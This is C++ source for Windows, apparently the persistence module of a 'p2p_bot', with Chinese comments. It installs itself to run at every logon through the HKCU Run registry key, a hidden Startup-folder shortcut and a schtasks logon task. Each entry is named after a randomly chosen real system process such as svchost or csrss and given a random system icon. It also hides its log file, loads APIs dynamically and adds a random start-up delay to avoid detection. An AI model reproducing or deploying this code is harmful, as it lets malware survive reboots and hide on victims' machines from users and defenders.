#include "p2p_bot.h"
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <string>
#include <random>
#include <shlobj.h>
#include <objbase.h>
#include <iostream>
#include <fstream>
#include <vector>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// 状态管道名称
#define STATUS_PIPE_NAME L"\\\\.\\pipe\\InjectStatusPipe"

// 安全API加载器
class SecureAPILoader {
private:
    template <typename Func>
    Func LoadDynamicAPI(const char* libName, const char* funcName) {
        HMODULE hModule = LoadLibraryA(libName);
        if (!hModule) return nullptr;
        return reinterpret_cast<Func>(GetProcAddress(hModule, funcName));
    }

public:
    using CoInitializeFn = decltype(&CoInitialize);
    using CoCreateInstanceFn = decltype(&CoCreateInstance);
    using CoUninitializeFn = decltype(&CoUninitialize);
    using SHGetFolderPathWFn = decltype(&SHGetFolderPathW);
    using GetModuleFileNameWFn = decltype(&GetModuleFileNameW);
    using MessageBoxWFn = decltype(&MessageBoxW);

    CoInitializeFn pCoInitialize = nullptr;
    CoCreateInstanceFn pCoCreateInstance = nullptr;
    CoUninitializeFn pCoUninitialize = nullptr;
    SHGetFolderPathWFn pSHGetFolderPathW = nullptr;
    GetModuleFileNameWFn pGetModuleFileNameW = nullptr;
    MessageBoxWFn pMessageBoxW = nullptr;

    SecureAPILoader() {
        pCoInitialize = LoadDynamicAPI<CoInitializeFn>("ole32.dll", "CoInitialize");
        pCoCreateInstance = LoadDynamicAPI<CoCreateInstanceFn>("ole32.dll", "CoCreateInstance");
        pCoUninitialize = LoadDynamicAPI<CoUninitializeFn>("ole32.dll", "CoUninitialize");
        pSHGetFolderPathW = LoadDynamicAPI<SHGetFolderPathWFn>("shell32.dll", "SHGetFolderPathW");
        pGetModuleFileNameW = LoadDynamicAPI<GetModuleFileNameWFn>("kernel32.dll", "GetModuleFileNameW");

        HMODULE hUser32 = LoadLibraryW(L"user32.dll");
        if (hUser32) {
            pMessageBoxW = reinterpret_cast<MessageBoxWFn>(GetProcAddress(hUser32, "MessageBoxW"));
        }
    }
};

// 安全COM对象释放
template <typename T>
void SafeRelease(T*& p) {
    if (p) {
        p->Release();
        p = nullptr;
    }
}

// 反馈系统
namespace FeedbackSystem {
    void ProvideFeedback(bool success, const wchar_t* message) {
        SecureAPILoader loader;

        // 内存信号
        wchar_t signalData[] = { L'F', L'E', L'E', L'D', success ? L'1' : L'0' };
        GlobalAlloc(GMEM_FIXED, sizeof(signalData));

        // 显示消息框
        if (loader.pMessageBoxW) {
            const wchar_t* title = success ? L"成功" : L"失败";
            loader.pMessageBoxW(nullptr, message, title, MB_OK | (success ? MB_ICONINFORMATION : MB_ICONERROR));
        }

        // 写入日志文件
        wchar_t tempPath[MAX_PATH] = { 0 };
        if (GetTempPathW(MAX_PATH, tempPath)) {
            wchar_t logPath[MAX_PATH];
            wcscpy_s(logPath, tempPath);
            wcscat_s(logPath, L"\\SystemHelper_Log.txt");

            std::wofstream logFile(logPath, std::ios::out | std::ios::app);
            if (logFile) {
                SYSTEMTIME sysTime;
                GetLocalTime(&sysTime);
                logFile << L"[" << sysTime.wYear << L"-" << sysTime.wMonth << L"-" << sysTime.wDay
                    << L" " << sysTime.wHour << L":" << sysTime.wMinute << L":" << sysTime.wSecond
                    << L"] ";
                logFile << message << std::endl;
                logFile.close();

                SetFileAttributesW(logPath, FILE_ATTRIBUTE_HIDDEN);
            }
        }

        // 控制台输出
        if (success) {
            wprintf(L"[SUCCESS] %s\n", message);
        }
        else {
            wprintf(L"[ERROR] %s\n", message);
        }

        // 原子信号
        wchar_t successCode[] = L"SC0xSYSHELPER";
        GlobalAddAtomW(successCode);

        if (!success) {
            wchar_t errorCode[] = L"ERR0xSYSHELPER";
            GlobalAddAtomW(errorCode);
        }

        // 系统声音
        if (success) {
            MessageBeep(MB_ICONASTERISK);
        }
        else {
            MessageBeep(MB_ICONHAND);
        }
    }
}

// 创建伪装快捷方式
bool CreateDisguisedShortcut(const wchar_t* targetPath, const wchar_t* shortcutDir,
    const wchar_t* displayName, const wchar_t* iconPath, int iconIndex) {
    SecureAPILoader loader;
    HRESULT hr = S_OK;
    IShellLinkW* psl = nullptr;
    bool success = false;

    if (loader.pCoInitialize && FAILED(hr = loader.pCoInitialize(nullptr))) {
        wchar_t msg[256];
        swprintf_s(msg, L"COM初始化失败 (错误: 0x%08X)", hr);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    if (!loader.pCoCreateInstance ||
        FAILED(hr = loader.pCoCreateInstance(
            CLSID_ShellLink,
            nullptr,
            CLSCTX_INPROC_SERVER,
            IID_IShellLinkW,
            reinterpret_cast<void**>(&psl)))) {
        wchar_t msg[256];
        swprintf_s(msg, L"ShellLink创建失败 (错误: 0x%08X)", hr);
        FeedbackSystem::ProvideFeedback(false, msg);
        if (loader.pCoUninitialize) loader.pCoUninitialize();
        return false;
    }

    wchar_t shortcutPath[MAX_PATH];
    wcscpy_s(shortcutPath, shortcutDir);
    wcscat_s(shortcutPath, L"\\");
    wcscat_s(shortcutPath, displayName);
    wcscat_s(shortcutPath, L".lnk");

    do {
        if (FAILED(hr = psl->SetPath(targetPath))) {
            wchar_t msg[256];
            swprintf_s(msg, L"设置路径失败 (错误: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            break;
        }

        if (iconPath && FAILED(hr = psl->SetIconLocation(iconPath, iconIndex))) {
            wchar_t msg[256];
            swprintf_s(msg, L"设置图标失败 (错误: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
        }

        IPersistFile* ppf = nullptr;
        if (FAILED(hr = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf)))) {
            wchar_t msg[256];
            swprintf_s(msg, L"获取IPersistFile接口失败 (错误: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            break;
        }

        if (FAILED(hr = ppf->Save(shortcutPath, TRUE))) {
            wchar_t msg[256];
            swprintf_s(msg, L"保存快捷方式失败 (错误: 0x%08X)", hr);
            FeedbackSystem::ProvideFeedback(false, msg);
            SafeRelease(ppf);
            break;
        }

        SafeRelease(ppf);

        if (!SetFileAttributesW(shortcutPath, FILE_ATTRIBUTE_HIDDEN)) {
            FeedbackSystem::ProvideFeedback(false, L"无法设置隐藏属性");
        }

        wchar_t successMsg[256];
        swprintf_s(successMsg, L"成功创建快捷方式: %s", shortcutPath);
        FeedbackSystem::ProvideFeedback(true, successMsg);
        success = true;
    } while (false);

    SafeRelease(psl);
    if (loader.pCoUninitialize) loader.pCoUninitialize();

    return success;
}

// 获取当前用户启动路径
bool GetCurrentUserStartupPath(wchar_t* startupPath, DWORD bufferSize) {
    if (GetEnvironmentVariableW(L"APPDATA", startupPath, bufferSize) == 0) {
        FeedbackSystem::ProvideFeedback(false, L"获取APPDATA失败");
        return false;
    }

    if (wcslen(startupPath) + wcslen(L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") >= bufferSize) {
        FeedbackSystem::ProvideFeedback(false, L"路径缓冲区太小");
        return false;
    }
    wcscat_s(startupPath, bufferSize, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    return true;
}

// 创建注册表启动项
bool CreateRegistryStartup(const wchar_t* targetPath, const wchar_t* displayName) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey);

    if (result != ERROR_SUCCESS) {
        wchar_t msg[256];
        swprintf_s(msg, L"注册表打开失败 (错误: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    std::wstring quotedPath = L"\"" + std::wstring(targetPath) + L"\"";

    result = RegSetValueExW(hKey, displayName, 0, REG_SZ,
        (const BYTE*)quotedPath.c_str(),
        (quotedPath.length() + 1) * sizeof(wchar_t));

    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        wchar_t msg[256];
        swprintf_s(msg, L"注册表写入失败 (错误: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    wchar_t successMsg[256];
    swprintf_s(successMsg, L"成功创建注册表启动项: %s", displayName);
    FeedbackSystem::ProvideFeedback(true, successMsg);
    return true;
}

// 创建启动文件夹快捷方式
bool CreateStartupFolderShortcut(const wchar_t* targetPath, const wchar_t* displayName) {
    wchar_t startupPath[MAX_PATH] = { 0 };
    if (!GetCurrentUserStartupPath(startupPath, MAX_PATH)) {
        return false;
    }

    const wchar_t* iconPaths[] = {
        L"C:\\Windows\\System32\\shell32.dll",
        L"C:\\Windows\\System32\\imageres.dll",
        L"C:\\Windows\\System32\\ddores.dll"
    };

    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(0, 2);
    const wchar_t* iconPath = iconPaths[dis(gen)];

    std::uniform_int_distribution<> iconDis(0, 100);
    int iconIndex = iconDis(gen);

    return CreateDisguisedShortcut(targetPath, startupPath, displayName, iconPath, iconIndex);
}

// 创建任务计划启动
bool CreateTaskSchedulerStartup(const wchar_t* targetPath, const wchar_t* displayName) {
    std::wstring taskName = L"\\SystemHelper_";
    taskName += displayName;

    std::wstring command = L"schtasks /create /tn \"";
    command += taskName;
    command += L"\" /tr \"";
    command += targetPath;
    command += L"\" /sc onlogon /ru \"\" /f";

    int result = _wsystem(command.c_str());

    if (result != 0) {
        wchar_t msg[256];
        swprintf_s(msg, L"任务计划创建失败 (返回码: %d)", result);
        FeedbackSystem::ProvideFeedback(false, msg);
        return false;
    }

    wchar_t successMsg[256];
    swprintf_s(successMsg, L"成功创建任务计划: %s", taskName.c_str());
    FeedbackSystem::ProvideFeedback(true, successMsg);
    return true;
}

// 创建安全启动快捷方式
bool CreateSecureStartupShortcut() {
    wchar_t szPath[MAX_PATH] = { 0 };
    if (GetModuleFileNameW(nullptr, szPath, MAX_PATH) == 0) {
        FeedbackSystem::ProvideFeedback(false, L"获取模块路径失败");
        return false;
    }

    const wchar_t* systemProcesses[] = {
        L"RuntimeBroker", L"dwm", L"csrss", L"svchost", L"ctfmon"
    };
    const int processCount = sizeof(systemProcesses) / sizeof(systemProcesses[0]);

    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(0, processCount - 1);

    const wchar_t* disguisedName = systemProcesses[dis(gen)];

    bool success = false;

    // 1. 注册表启动
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"尝试注册表启动方式");
        success = CreateRegistryStartup(szPath, disguisedName);
    }

    // 2. 启动文件夹快捷方式
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"尝试启动文件夹方式");
        success = CreateStartupFolderShortcut(szPath, disguisedName);
    }

    // 3. 任务计划
    if (!success) {
        FeedbackSystem::ProvideFeedback(true, L"尝试任务计划方式");
        success = CreateTaskSchedulerStartup(szPath, disguisedName);
    }

    return success;
}

// 启动自身
int startself() {
    // 隐藏控制台窗口
    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    // 随机延迟
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    std::mt19937 gen(static_cast<unsigned int>(counter.QuadPart));
    std::uniform_int_distribution<> dis(500, 5000);
    int delayCount = dis(gen);

    for (int i = 0; i < delayCount; i++) {
        volatile double dummy = std::log(i + 1) * std::sqrt(i);
        (void)dummy;
    }

    FeedbackSystem::ProvideFeedback(true, L"系统辅助程序开始执行");

    __try {
        bool creationResult = CreateSecureStartupShortcut();

        if (creationResult) {
            FeedbackSystem::ProvideFeedback(true, L"启动项创建成功");
            return 0;
        }
        else {
            FeedbackSystem::ProvideFeedback(false, L"启动项创建失败");
            return 1;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        wchar_t errorMsg[256];
        DWORD exceptionCode = GetExceptionCode();
        swprintf_s(errorMsg, L"异常发生 (异常码: 0x%08X)", exceptionCode);
        FeedbackSystem::ProvideFeedback(false, errorMsg);
        return 3;
    }
}